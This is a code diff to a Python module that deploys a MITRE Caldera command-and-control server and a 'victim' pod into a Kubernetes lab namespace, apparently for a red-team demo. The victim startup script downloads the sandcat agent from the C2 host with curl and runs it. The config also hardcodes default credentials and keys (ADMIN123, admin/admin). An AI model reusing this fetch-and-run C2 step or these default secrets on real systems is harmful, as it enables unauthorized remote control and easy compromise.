@@ -4,9 +4,22 @@ All calls use the red-team API key (ADMIN123 by default).
 """
 import os
 import requests
+from kubernetes import client, config
+from kubernetes.client.exceptions import ApiException
 
 CALDERA_URL = os.environ.get("CALDERA_URL", "http://caldera.piap.svc.cluster.local:8888")
 API_KEY = os.environ.get("CALDERA_API_KEY", "ADMIN123")
+NAMESPACE = "piap"
+
+
+def _core():
+    config.load_incluster_config()
+    return client.CoreV1Api()
+
+
+def _apps():
+    config.load_incluster_config()
+    return client.AppsV1Api()
 
 # ── Demo scenario definitions ─────────────────────────────────────────────────
 # Each scenario becomes one Caldera adversary with N abilities (atomic steps).
@@ -105,12 +118,214 @@ def _headers():
     return {"KEY": API_KEY, "Content-Type": "application/json"}
 
 
+def is_deployed():
+    """Return True if the caldera Deployment exists in the cluster."""
+    try:
+        _apps().read_namespaced_deployment("caldera", NAMESPACE)
+        return True
+    except ApiException as e:
+        if e.status == 404:
+            return False
+        raise
+    except Exception:
+        return False
+
+
 def is_available():
     try:
         r = requests.get(f"{CALDERA_URL}/api/v2/agents", headers=_headers(), timeout=3)
         return r.status_code == 200
     except Exception:
         return False
+
+
+def deploy_caldera():
+    """
+    Create (or idempotently re-apply) the Caldera C2 + victim pod resources:
+      ConfigMap caldera-config, Deployment caldera, Service caldera,
+      ConfigMap caldera-victim-script, Deployment caldera-victim.
+    """
+    core = _core()
+    apps = _apps()
+
+    # ── 1. ConfigMap: caldera-config ────────────────────────────────────────
+    local_yml = (
+        "host: 0.0.0.0\n"
+        "port: 8888\n"
+        "app.contact.http: http://caldera.piap.svc.cluster.local:8888\n"
+        "app.contact.html: /beacon\n"
+        "api_key_red: ADMIN123\n"
+        "api_key_blue: BLUEADMIN123\n"
+        "users:\n"
+        "  red:\n"
+        "    admin: admin\n"
+        "  blue:\n"
+        "    admin: admin\n"
+        "plugins:\n"
+        "  - access\n"
+        "  - debrief\n"
+        "  - fieldmanual\n"
+        "  - manx\n"
+        "  - response\n"
+        "  - sandcat\n"
+        "  - stockpile\n"
+        "  - training\n"
+        "crypt_salt: piap-demo-salt\n"
+        "encryption_key: piap-demo-enc-key\n"
+        "exfil_dir: /tmp/caldera\n"
+        "reports_dir: /tmp\n"
+    )
+    cm_config = client.V1ConfigMap(
+        metadata=client.V1ObjectMeta(name="caldera-config", namespace=NAMESPACE),
+        data={"local.yml": local_yml},
+    )
+    try:
+        core.create_namespaced_config_map(NAMESPACE, cm_config)
+    except ApiException as e:
+        if e.status == 409:
+            core.patch_namespaced_config_map("caldera-config", NAMESPACE, cm_config)
+        else:
+            raise
+
+    # ── 2. Deployment: caldera ───────────────────────────────────────────────
+    caldera_dep = client.V1Deployment(
+        metadata=client.V1ObjectMeta(
+            name="caldera", namespace=NAMESPACE, labels={"app": "caldera"}
+        ),
+        spec=client.V1DeploymentSpec(
+            replicas=1,
+            selector=client.V1LabelSelector(match_labels={"app": "caldera"}),
+            strategy=client.V1DeploymentStrategy(type="Recreate"),
+            template=client.V1PodTemplateSpec(
+                metadata=client.V1ObjectMeta(labels={"app": "caldera"}),
+                spec=client.V1PodSpec(
+                    restart_policy="Always",
+                    containers=[client.V1Container(
+                        name="caldera",
+                        image="ghcr.io/mitre/caldera:5.2.0",
+                        ports=[client.V1ContainerPort(container_port=8888)],
+                        volume_mounts=[client.V1VolumeMount(
+                            name="caldera-config",
+                            mount_path="/usr/src/app/conf/local.yml",
+                            sub_path="local.yml",
+                        )],
+                        resources=client.V1ResourceRequirements(
+                            requests={"memory": "512Mi", "cpu": "250m"},
+                            limits={"memory": "2Gi", "cpu": "1000m"},
+                        ),
+                    )],
+                    volumes=[client.V1Volume(
+                        name="caldera-config",
+                        config_map=client.V1ConfigMapVolumeSource(name="caldera-config"),
+                    )],
+                ),
+            ),
+        ),
+    )
+    try:
+        apps.create_namespaced_deployment(NAMESPACE, caldera_dep)
+    except ApiException as e:
+        if e.status == 409:
+            apps.patch_namespaced_deployment("caldera", NAMESPACE, caldera_dep)
+        else:
+            raise
+
+    # ── 3. Service: caldera (NodePort 30600) ─────────────────────────────────
+    svc = client.V1Service(
+        metadata=client.V1ObjectMeta(
+            name="caldera", namespace=NAMESPACE, labels={"app": "caldera"}
+        ),
+        spec=client.V1ServiceSpec(
+            type="NodePort",
+            selector={"app": "caldera"},
+            ports=[client.V1ServicePort(
+                name="http", port=8888, target_port=8888, node_port=30600,
+            )],
+        ),
+    )
+    try:
+        core.create_namespaced_service(NAMESPACE, svc)
+    except ApiException as e:
+        if e.status != 409:
+            raise
+
+    # ── 4. ConfigMap: caldera-victim-script ──────────────────────────────────
+    victim_script = (
+        "#!/bin/bash\n"
+        "set -e\n\n"
+        "echo '[victim] Installing tools...'\n"
+        "apt-get update -qq && apt-get install -y -qq curl wget iputils-ping netcat-openbsd 2>/dev/null || true\n\n"
+        "echo '[victim] Waiting for Caldera C2 to be ready...'\n"
+        "until curl -sf --max-time 3 http://caldera.piap.svc.cluster.local:8888 > /dev/null 2>&1; do\n"
+        "  echo '[victim] Caldera not ready, retrying in 15s...'\n"
+        "  sleep 15\n"
+        "done\n\n"
+        "echo '[victim] Caldera is up — downloading sandcat agent...'\n"
+        "curl -s -X POST \\\n"
+        "  -H 'file:sandcat.go-linux' \\\n"
+        "  -H 'platform:linux' \\\n"
+        "  http://caldera.piap.svc.cluster.local:8888/file/download \\\n"
+        "  -o /tmp/sandcat\n\n"
+        "chmod +x /tmp/sandcat\n"
+        "echo '[victim] Agent downloaded. Connecting to C2 (group: red)...'\n"
+        "/tmp/sandcat -server http://caldera.piap.svc.cluster.local:8888 -group red -v\n"
+    )
+    cm_victim = client.V1ConfigMap(
+        metadata=client.V1ObjectMeta(name="caldera-victim-script", namespace=NAMESPACE),
+        data={"start.sh": victim_script},
+    )
+    try:
+        core.create_namespaced_config_map(NAMESPACE, cm_victim)
+    except ApiException as e:
+        if e.status == 409:
+            core.patch_namespaced_config_map("caldera-victim-script", NAMESPACE, cm_victim)
+        else:
+            raise
+
+    # ── 5. Deployment: caldera-victim ────────────────────────────────────────
+    victim_dep = client.V1Deployment(
+        metadata=client.V1ObjectMeta(
+            name="caldera-victim", namespace=NAMESPACE, labels={"app": "caldera-victim"}
+        ),
+        spec=client.V1DeploymentSpec(
+            replicas=1,
+            selector=client.V1LabelSelector(match_labels={"app": "caldera-victim"}),
+            strategy=client.V1DeploymentStrategy(type="Recreate"),
+            template=client.V1PodTemplateSpec(
+                metadata=client.V1ObjectMeta(labels={"app": "caldera-victim"}),
+                spec=client.V1PodSpec(
+                    restart_policy="Always",
+                    containers=[client.V1Container(
+                        name="victim",
+                        image="ubuntu:22.04",
+                        command=["/bin/bash", "/scripts/start.sh"],
+                        volume_mounts=[client.V1VolumeMount(
+                            name="victim-script",
+                            mount_path="/scripts",
+                        )],
+                        resources=client.V1ResourceRequirements(
+                            requests={"memory": "128Mi", "cpu": "50m"},
+                            limits={"memory": "512Mi", "cpu": "250m"},
+                        ),
+                    )],
+                    volumes=[client.V1Volume(
+                        name="victim-script",
+                        config_map=client.V1ConfigMapVolumeSource(
+                            name="caldera-victim-script",
+                            default_mode=0o755,
+                        ),
+                    )],
+                ),
+            ),
+        ),
+    )
+    try:
+        apps.create_namespaced_deployment(NAMESPACE, victim_dep)
+    except ApiException as e:
+        if e.status == 409:
+            apps.patch_namespaced_deployment("caldera-victim", NAMESPACE, victim_dep)
+        else:
+            raise
 
 
 def get_agents():
